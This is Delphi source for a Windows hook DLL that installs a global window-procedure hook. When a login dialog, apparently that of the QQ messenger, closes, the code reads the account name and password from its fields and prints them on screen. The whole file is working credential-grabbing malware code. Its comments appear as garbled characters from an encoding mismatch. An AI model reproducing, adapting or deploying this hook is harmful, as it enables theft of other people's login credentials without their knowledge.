library HookDLL;

uses Windows, Messages;

var WndProcHook: DWORD;

 // ȡQQ����
procedure GetPassWord(Dialog: HWND);
var
  ComboBox, Edit: HWND;
  Buffer: array[0..20] of Char;
  TmpStr: string;
  ScreenDC: HDC;
begin
 // Լ������
  if FindWindowEx(Dialog, 0, 'Button', 'ע����') = 0 then Exit;
  
  GetClassName(Dialog, Buffer, 20);
  if (Buffer <> '#32770') then Exit;

 // �ؼ����
  ComboBox := FindWindowEx(Dialog, 0, 'ComboBox', nil);
  if (ComboBox = 0) then Exit;

  Edit := FindWindowEx(Dialog, 0, 'Edit', nil);
  if (Edit = 0) then Exit;

 // �ؼ�����
  Buffer[GetWindowText(ComboBox, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := '����: ' + Buffer;

  Buffer[GetWindowText(Edit, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := TmpStr + '����: ' + Buffer;

 // д����Ļ
  ScreenDC := GetDC(0);
  TextOut(ScreenDC, 0, 0, PChar(TmpStr), Length(TmpStr));
  ReleaseDC(0, ScreenDC);
end;

 // ���ӻص�
function CallWndProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
 // ���弴�������
  if (nCode = HC_ACTION) and (PCWPStruct(lParam).message = WM_DESTROY) then
    GetPassWord(PCWPStruct(lParam).hwnd);

 // ������һ������
  Result := CallNextHookEx(WndProcHook, nCode, wParam, lParam);
end;

 // �ҹ�
procedure HookOn();
begin
  WndProcHook := SetWindowsHookEx(WH_CALLWNDPROC, @CallWndProc, HInstance, 0);
end;

 // �ѹ�
procedure HookOff();
begin
  UnHookWindowsHookEx(WndProcHook);
end;     

 // ����
exports HookOn, HookOff;
  
begin
end.    
